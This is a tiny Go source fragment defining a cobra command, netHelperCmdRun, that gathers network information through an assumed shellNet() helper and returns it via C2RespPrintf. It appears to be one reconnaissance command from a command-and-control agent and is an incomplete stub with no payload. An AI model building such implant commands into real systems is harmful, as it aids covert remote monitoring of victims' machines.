package agent

import (
	"github.com/spf13/cobra"
)

// netHelperCmdRun displays network information.
func netHelperCmdRun(cmd *cobra.Command, args []string) {
	// Assume shellNet() exists and returns network info.
	out := shellNet()
	C2RespPrintf(cmd, "%s", out)
}
